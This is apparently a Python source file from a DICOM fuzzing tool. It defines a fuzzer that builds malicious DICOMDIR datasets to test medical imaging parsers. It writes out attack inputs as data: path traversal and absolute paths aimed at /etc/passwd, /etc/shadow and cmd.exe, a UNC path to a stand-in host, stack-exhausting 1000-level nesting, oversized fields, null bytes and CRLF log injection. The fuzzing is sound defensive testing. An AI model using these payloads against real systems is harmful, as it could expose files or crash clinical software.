"""DICOMDIR Fuzzer - DICOM File-Set Directory Attacks.

Category: generic

Attacks:
- path_traversal: "../" sequences in ReferencedFileID (CWE-22)
- absolute_path: Absolute paths in ReferencedFileID (CVE-2026-32711)
- deep_nesting: 1000-level DirectoryRecordSequence (fo-dicom #1977 stack overflow)
- overlong_component: CS VR overflow via 100K-char path components
- null_byte_injection: Null bytes in CS path components
- fileset_id_attack: FileSetID boundary and injection attacks
"""

from __future__ import annotations

import random

from pydicom.dataset import Dataset
from pydicom.sequence import Sequence
from pydicom.uid import generate_uid

from dicom_fuzzer.utils.logger import get_logger

from .base import FormatFuzzerBase

logger = get_logger(__name__)

_DICOMDIR_SOP_CLASS = "1.2.840.10008.1.3.10"
_DUMMY_SOP_CLASS = "1.2.840.10008.5.1.4.1.1.2"  # CT Image Storage
_DUMMY_TRANSFER_SYNTAX = "1.2.840.10008.1.2.1"  # Explicit VR Little Endian

# Path traversal sequences targeting POSIX and Windows path resolution.
# CVE-2026-32711: pathlib '/' discards left operand when right is absolute.
_TRAVERSAL_SEQUENCES = [
    ["IMAGES", "..", "..", "etc", "passwd"],
    ["IMAGES", "..", "..", "..", "windows", "system32", "cmd.exe"],
    ["..", "..", "etc", "shadow"],
    ["IMAGES", "..%2f..%2fetc%2fpasswd"],
    ["IMAGES", "....//....//etc//passwd"],
]

_ABSOLUTE_PATHS = [
    ["/etc/passwd"],
    ["/etc/shadow"],
    ["C:\\Windows\\System32\\cmd.exe"],
    ["/proc/self/mem"],
    ["\\\\evil.invalid\\share\\payload"],
]


def _make_record(file_id: list[str]) -> Dataset:
    """Return a minimal IMAGE DirectoryRecord item with the given ReferencedFileID."""
    item = Dataset()
    item.DirectoryRecordType = "IMAGE"
    item.ReferencedFileID = file_id
    item.ReferencedSOPClassUIDInFile = _DUMMY_SOP_CLASS
    item.ReferencedSOPInstanceUIDInFile = generate_uid()
    item.ReferencedTransferSyntaxUIDInFile = _DUMMY_TRANSFER_SYNTAX
    return item


class DicomdirFuzzer(FormatFuzzerBase):
    """DICOMDIR (Media Storage Directory) path traversal and structure attacks.

    DICOMDIR (SOP class 1.2.840.10008.1.3.10) is a flat-file index stored at
    the root of a DICOM File Set. It maps logical record paths to physical
    files via ReferencedFileID (0004,1500), a sequence of CS-VR components.

    Implementations that join those components with pathlib or os.path.join
    without sanitisation are vulnerable to directory traversal (CWE-22).
    pydicom CVE-2026-32711: pathlib '/' operator discards its left operand
    when the right operand is an absolute path, letting a crafted DICOMDIR
    read/write/delete files outside the File Set root.

    All attacks set SOPClassUID to the DICOMDIR SOP class so the output is
    a plausible DICOMDIR regardless of the seed file type.
    """

    def __init__(self) -> None:
        """Initialize DicomdirFuzzer with structural and content strategies."""
        super().__init__()
        self.structural_strategies = [
            self._path_traversal,  # [STRUCTURAL] "../" sequences -- CWE-22 traversal
            self._absolute_path,  # [STRUCTURAL] absolute paths -- CVE-2026-32711
            self._deep_nesting,  # [STRUCTURAL] 1000-level SQ -- fo-dicom stack overflow
            self._overlong_component,  # [STRUCTURAL] 100K CS component -- buffer overflow
        ]
        self.content_strategies = [
            self._null_byte_injection,  # [CONTENT] null bytes in CS path components
            self._fileset_id_attack,  # [CONTENT] FileSetID boundary/injection
        ]
        self.mutation_strategies = self.structural_strategies + self.content_strategies

    @property
    def strategy_name(self) -> str:
        """Return the strategy name for identification."""
        return "dicomdir"

    def mutate(self, dataset: Dataset) -> Dataset:
        """Replace dataset with a malicious DICOMDIR structure.

        Sets SOPClassUID to the DICOMDIR SOP class and injects a crafted
        DirectoryRecordSequence regardless of the incoming dataset type.

        Args:
            dataset: The DICOM dataset to mutate (already a copy)

        Returns:
            Mutated dataset shaped as a malicious DICOMDIR

        """
        dataset.SOPClassUID = _DICOMDIR_SOP_CLASS
        dataset.FileSetID = "FUZZSET"

        selected = random.sample(self.structural_strategies, k=random.randint(1, 2))
        if random.random() < 0.5:
            selected.append(random.choice(self.content_strategies))
        self.last_variant = ",".join(s.__name__ for s in selected)

        for strategy in selected:
            try:
                dataset = strategy(dataset)
            except Exception as e:
                logger.debug("DICOMDIR mutation %s failed: %s", strategy.__name__, e)

        return dataset

    def _path_traversal(self, dataset: Dataset) -> Dataset:
        """Inject '../' path traversal sequences into ReferencedFileID.

        Targets DICOM file-set implementations that join path components
        without stripping '../' sequences (CWE-22 / path traversal).
        """
        file_id = random.choice(_TRAVERSAL_SEQUENCES)
        dataset.DirectoryRecordSequence = Sequence([_make_record(file_id)])
        return dataset

    def _absolute_path(self, dataset: Dataset) -> Dataset:
        """Inject absolute paths into ReferencedFileID.

        CVE-2026-32711: pathlib '/' operator discards the left operand when
        the right is absolute. A DICOMDIR with '/etc/passwd' in
        ReferencedFileID can therefore escape the File Set root in any
        implementation that uses pathlib for path construction.
        """
        file_id = random.choice(_ABSOLUTE_PATHS)
        dataset.DirectoryRecordSequence = Sequence([_make_record(file_id)])
        return dataset

    def _deep_nesting(self, dataset: Dataset) -> Dataset:
        """Create a DirectoryRecordSequence nested 1000 levels deep.

        fo-dicom #1977: DicomDirectory parses records recursively. A deeply
        nested DICOMDIR can exhaust the call stack and cause a stack overflow
        before any application-level record processing begins.

        Each level wraps the previous record in a new SQ item via
        OffsetOfNextDirectoryRecord (0004,1400) semantics simulated here
        by embedding items inside one another.
        """
        depth = 1000
        inner = Dataset()
        inner.DirectoryRecordType = "IMAGE"
        inner.ReferencedFileID = ["IMAGES", "leaf.dcm"]
        inner.ReferencedSOPClassUIDInFile = _DUMMY_SOP_CLASS
        inner.ReferencedSOPInstanceUIDInFile = generate_uid()
        inner.ReferencedTransferSyntaxUIDInFile = _DUMMY_TRANSFER_SYNTAX

        # Build chain: each wrapper item contains the previous as a nested SQ
        current = inner
        for _ in range(depth):
            wrapper = Dataset()
            wrapper.DirectoryRecordType = "STUDY"
            wrapper.DirectoryRecordSequence = Sequence([current])
            current = wrapper

        dataset.DirectoryRecordSequence = Sequence([current])
        return dataset

    def _overlong_component(self, dataset: Dataset) -> Dataset:
        """Set a ReferencedFileID component far beyond the CS VR 16-char limit.

        CS VR allows at most 16 characters per component per PS3.5 Table 6.2-1.
        Implementations that read the component into a fixed-size buffer without
        checking the VR length constraint are susceptible to overflow.
        """
        attack = random.choice(["single_huge", "many_huge", "boundary"])
        if attack == "single_huge":
            file_id = ["A" * 100_000]
        elif attack == "many_huge":
            file_id = ["A" * 65_536, "B" * 65_536, "C" * 65_536]
        else:  # boundary
            file_id = ["A" * 17]  # one over the 16-char CS limit
        dataset.DirectoryRecordSequence = Sequence([_make_record(file_id)])
        return dataset

    def _null_byte_injection(self, dataset: Dataset) -> Dataset:
        """Inject null bytes into ReferencedFileID path components.

        C-string implementations that treat the first null byte as end-of-string
        will silently truncate path components, confusing path resolution.
        """
        attack = random.choice(["null_in_middle", "null_prefix", "null_only"])
        if attack == "null_in_middle":
            file_id = ["IMAGES\x00payload", "file.dcm"]
        elif attack == "null_prefix":
            file_id = ["\x00etc", "passwd"]
        else:
            file_id = ["\x00", "\x00\x00\x00"]
        dataset.DirectoryRecordSequence = Sequence([_make_record(file_id)])
        return dataset

    def _fileset_id_attack(self, dataset: Dataset) -> Dataset:
        """Corrupt FileSetID (0004,1130) with boundary and injection values.

        FileSetID is a CS tag limited to 16 characters. Systems that display
        or log it without length checks may be vulnerable to buffer overflows
        or log injection.
        """
        attack = random.choice(["empty", "overlong", "injection", "null_byte"])
        if attack == "empty":
            dataset.FileSetID = ""
        elif attack == "overlong":
            dataset.FileSetID = "F" * 65_536
        elif attack == "injection":
            dataset.FileSetID = random.choice(
                [
                    "../../../etc/passwd",
                    "FUZZ\x00hidden",
                    "ID\nX-Injected: 1",
                    "ID\r\nmalicious",
                ]
            )
        else:
            dataset.FileSetID = "\x00" * 16
        return dataset


__all__ = ["DicomdirFuzzer"]
